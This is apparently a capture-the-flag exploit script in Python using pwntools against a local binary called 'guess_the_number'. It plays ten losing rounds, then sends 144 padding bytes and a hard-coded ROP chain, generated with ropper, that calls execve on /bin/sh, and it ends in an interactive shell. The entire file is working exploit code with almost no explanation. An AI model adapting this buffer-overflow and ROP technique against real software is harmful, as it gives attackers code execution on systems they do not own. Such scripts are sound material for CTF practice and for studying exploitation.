#!/bin/env python3
from pwn import *

path = context.binary = './guess_the_number_5c1549905c60d35ca812b2e666b7644b'
p = process(argv=[path, 'bnz'])

# ROP chain generated using ropper:
# ropper -f guess_the_number_5c1549905c60d35ca812b2e666b7644b --chain execve | tail -n +5 | python2 | xxd -i
rop = [
	0x16, 0xe1, 0x0b, 0x08, 0x2f, 0x2f, 0x62, 0x69, 0xdb, 0x03, 0x07, 0x08,
	0x00, 0x20, 0x0f, 0x08, 0x45, 0x81, 0x05, 0x08, 0x16, 0xe1, 0x0b, 0x08,
	0x6e, 0x2f, 0x73, 0x68, 0xdb, 0x03, 0x07, 0x08, 0x04, 0x20, 0x0f, 0x08,
	0x45, 0x81, 0x05, 0x08, 0x16, 0xe1, 0x0b, 0x08, 0x00, 0x00, 0x00, 0x00,
	0xdb, 0x03, 0x07, 0x08, 0x08, 0x20, 0x0f, 0x08, 0x45, 0x81, 0x05, 0x08,
	0x02, 0x04, 0x07, 0x08, 0x08, 0x20, 0x0f, 0x08, 0xef, 0xbe, 0xad, 0xde,
	0xd1, 0x81, 0x04, 0x08, 0x00, 0x20, 0x0f, 0x08, 0xdb, 0x03, 0x07, 0x08,
	0x08, 0x20, 0x0f, 0x08, 0x16, 0xe1, 0x0b, 0x08, 0x0b, 0x00, 0x00, 0x00,
	0x10, 0x0d, 0x07, 0x08, 0x0a
]

for _ in range(10): # lose 10 time
	print(p.recvuntil('Your guess?').decode('utf-8'))
	p.sendline('0')
p.recvuntil('Y/n?')
p.sendline(b'n'*144 + bytes(rop))

p.interactive()
